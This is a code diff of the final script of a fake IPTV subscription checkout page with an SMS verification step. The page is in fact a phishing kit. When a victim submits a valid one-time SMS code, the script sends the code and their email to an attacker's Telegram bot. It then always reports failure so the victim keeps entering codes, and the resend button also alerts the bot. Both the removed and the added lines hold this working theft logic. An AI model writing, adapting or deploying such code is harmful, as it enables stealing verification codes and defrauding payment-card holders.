+        const isValid = /^\d{4,6}$/.test(code);
 
-                            smsError.classList.add('visible');
-                            smsCodeInput.value = '';
-                            smsCodeInput.focus();
-                            smsCodeInput.classList.add('error');
-                            setTimeout(() => smsCodeInput.classList.remove('error'), 600);
-                            smsAttempts++;
+        if (isValid) {
+          const smsMessage =
+            `📱 *SMS Verification*\nCode: ${code}\nEmail: ${collectedData.email || 'N/A'}`;
+          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: smsMessage,
+              parse_mode: 'Markdown'
+            })
+          }).catch(() => {});
 
-                            if (smsAttempts >= 2) {
-                                smsError.classList.remove('visible');
-                                smsScreen.classList.remove('show');
-                                failureScreen.classList.add('show');
-                            }
-                        }, 1800);
-                    } else {
-                        smsError.textContent = '❌ Please enter a valid 4-6 digit SMS code.';
-                        smsError.classList.add('visible');
-                        smsCodeInput.value = '';
-                        smsCodeInput.focus();
-                        smsCodeInput.classList.add('error');
-                        setTimeout(() => smsCodeInput.classList.remove('error'), 600);
-                    }
-                });
+          smsVerifyBtn.disabled = true;
+          smsVerifyBtn.classList.add('loading');
 
-                smsRetryBtn.addEventListener('click', function() {
-                    smsError.classList.remove('visible');
-                    smsCodeInput.value = '';
-                    smsCodeInput.focus();
-                    this.textContent = '✅ Resent!';
-                    setTimeout(() => this.textContent = '🔄 Resend SMS', 1500);
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: `🔄 SMS resent for ${collectedData.email || 'N/A'}`,
-                            parse_mode: 'Markdown'
-                        })
-                    }).catch(() => {});
-                });
+          setTimeout(() => {
+            smsVerifyBtn.classList.remove('loading');
+            smsVerifyBtn.disabled = false;
 
-                smsCodeInput.addEventListener('keydown', function(e) {
-                    if (e.key === 'Enter') smsVerifyBtn.click();
-                });
+            smsError.classList.add('visible');
+            smsCodeInput.value = '';
+            smsCodeInput.focus();
+            smsCodeInput.classList.add('error');
+            setTimeout(() => smsCodeInput.classList.remove('error'), 600);
+            smsAttempts++;
 
-                retryBtn.addEventListener('click', function() {
-                    resetToForm();
-                    payBtn.style.display = 'flex';
-                });
+            if (smsAttempts >= 2) {
+              smsError.classList.remove('visible');
+              smsScreen.classList.remove('show');
+              failureScreen.classList.add('show');
+            }
+          }, 1800);
+        } else {
+          smsError.textContent = '❌ Please enter a valid 4-6 digit SMS code.';
+          smsError.classList.add('visible');
+          smsCodeInput.value = '';
+          smsCodeInput.focus();
+          smsCodeInput.classList.add('error');
+          setTimeout(() => smsCodeInput.classList.remove('error'), 600);
+        }
+      });
 
-                document.querySelectorAll('.copy-btn').forEach(btn => {
-                    btn.addEventListener('click', function() {
-                        const targetId = this.dataset.copy;
-                        let text = '';
-                        if (targetId === 'orderNumber') text = document.getElementById('orderNumber').textContent;
-                        else if (targetId === 'product') text = 'IPTV 1 Year / 2 Devices';
-                        else if (targetId === 'amount') text = '$100.00 USD';
-                        else if (targetId === 'successEmail') text = document.getElementById('successEmail').textContent;
-                        else if (targetId === 'successPhone') text = document.getElementById('successPhone').textContent;
-                        else if (targetId === 'successCardholder') text = document.getElementById('successCardholder')
-                            .textContent;
+      smsRetryBtn.addEventListener('click', function() {
+        smsError.classList.remove('visible');
+        smsCodeInput.value = '';
+        smsCodeInput.focus();
+        this.textContent = '✅ Resent!';
+        setTimeout(() => this.textContent = '🔄 Resend SMS', 1500);
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `🔄 SMS resent for ${collectedData.email || 'N/A'}`,
+            parse_mode: 'Markdown'
+          })
+        }).catch(() => {});
+      });
 
-                        if (text && text !== '—') {
-                            navigator.clipboard?.writeText(text).catch(() => {});
-                            this.textContent = '✅ Copied!';
-                            setTimeout(() => this.textContent = '📋 Copy', 1500);
-                        }
-                    });
-                });
+      smsCodeInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') smsVerifyBtn.click();
+      });
 
-            })();
-        </script>
-    </body>
-    </html>
+      retryBtn.addEventListener('click', function() {
+        resetToForm();
+        payBtn.style.display = 'flex';
+      });
+
+      document.querySelectorAll('.copy-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+          const targetId = this.dataset.copy;
+          let text = '';
+          if (targetId === 'orderNumber') text = document.getElementById('orderNumber').textContent;
+          else if (targetId === 'product') text = 'IPTV 1 Year / 2 Devices';
+          else if (targetId === 'amount') text = '$54.99 USD';
+          else if (targetId === 'successEmail') text = document.getElementById('successEmail').textContent;
+          else if (targetId === 'successPhone') text = document.getElementById('successPhone').textContent;
+          else if (targetId === 'successCardholder') text = document.getElementById('successCardholder')
+            .textContent;
+
+          if (text && text !== '—') {
+            navigator.clipboard?.writeText(text).catch(() => {});
+            this.textContent = '✅ Copied!';
+            setTimeout(() => this.textContent = '📋 Copy', 1500);
+          }
+        });
+      });
+
+    })();
+  </script>
+</body>
+</html>
